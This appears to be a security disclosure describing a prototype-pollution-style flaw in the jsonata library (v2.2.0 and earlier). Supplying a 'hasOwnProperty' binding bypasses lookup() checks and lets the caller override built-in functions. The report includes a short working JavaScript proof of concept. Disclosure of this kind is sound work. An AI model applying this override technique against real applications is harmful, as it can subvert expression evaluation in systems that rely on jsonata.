## Title: Function Binding Prototype Pollution via hasOwnProperty Override in jsonata ≤ v2.2.0

**BUG_Author:** Frederick
**Affected Version:** v2.2.0
**Vendor:** https://github.com/jsonata-js/jsonata
**Software:** https://www.npmjs.com/package/jsonata
**Vulnerability Files:**
- `src/jsonata.js` line 1857 (`createFrame()` with `var bindings = {}`)
- `src/jsonata.js` line 1861 (`bindings[name] = value` in `bind()`)
- `src/jsonata.js` line 1865 (`bindings.hasOwnProperty(name)` security check in `lookup()`)
- `src/jsonata.js` line 2146-2147 (user bindings `for...in` loop)
- `src/jsonata.js` line 229 (`createFrameFromTuple()` with `for...in`)

## Description:

1. **Insecure Frame Binding Construction:**
   - The `createFrame()` function creates variable bindings using a plain object (`var bindings = {}`)
   - The `bind()` method assigns values directly: `bindings[name] = value` — no `hasOwnProperty` check
   - The `lookup()` method uses `bindings.hasOwnProperty(name)` as a security check, but this can be bypassed.

2. **hasOwnProperty Override Bypass:**
   - When user-supplied bindings contain a property named `hasOwnProperty`, the `for...in` loop iterates it and `bind()` writes it to the frame's bindings object.
   - This shadows the inherited `Object.prototype.hasOwnProperty`, causing `lookup()` to call the attacker's version.
   - Result: the security check in `lookup()` is completely bypassed.

3. **Built-in Function Override:**
   - All 63 built-in functions (`$sum`, `$count`, `$string`, `$filter`, `$eval`, etc.) are stored in the frame's prototype chain.
   - By injecting properties with matching names through the bindings mechanism, any built-in function can be replaced.
   - A `hasOwnProperty` override that returns `true` makes the lookup return the injected function instead of the built-in.

## Proof of Concept:

1. Install jsonata v2.2.0: `npm install jsonata@2.2.0`
2. Run the PoC: `node poc.js`

```javascript
const jsonata = require("jsonata");

// hasOwnProperty override bypasses lookup() protection
const evilBindings = {};
evilBindings.hasOwnProperty = function() { return true; };
evilBindings.sum = function() { return "HACKED_SUM"; };

const expr = jsonata("$sum([1,2,3])");
const result = await expr.evaluate({}, evilBindings);
// Result: "HACKED_SUM" — built-in $sum function replaced, lookup() bypassed
```
